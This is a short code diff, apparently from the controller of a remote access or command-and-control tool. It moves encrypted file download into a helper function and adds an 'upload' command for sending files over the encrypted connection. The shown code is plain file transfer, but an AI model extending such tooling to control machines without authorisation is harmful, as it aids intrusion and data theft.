@@ -14,6 +14,7 @@ import sys
 import time
 
 from core import common
+from core.file import recvfile, sendfile
 
 
 # ascii banner (Crawford2) - http://patorjk.com/software/taag/
@@ -112,14 +113,14 @@ def main():
         elif cmd == 'download':
             for fname in action.split():
                 fname = fname.strip()
-                
-                with open(fname, 'wb') as f:
-                    datasize = struct.unpack("!I", conn.recv(4))[0]
-                    while datasize:
-                        res = conn.recv(datasize)
-                        f.write(decrypt(res, DHKEY))
-                        datasize = struct.unpack("!I", conn.recv(4))[0]
-                        
+                recvfile(conn, fname, DHKEY)
+
+        # send file
+        elif cmd == 'upload':
+            for fname in action.split():
+                fname = fname.strip()
+                sendfile(conn, fname, DHKEY)
+
         # regenerate DH key (dangerous! may cause connection loss!)
         # available in case a fallback occurs or you suspect eavesdropping
         elif cmd == 'rekey':
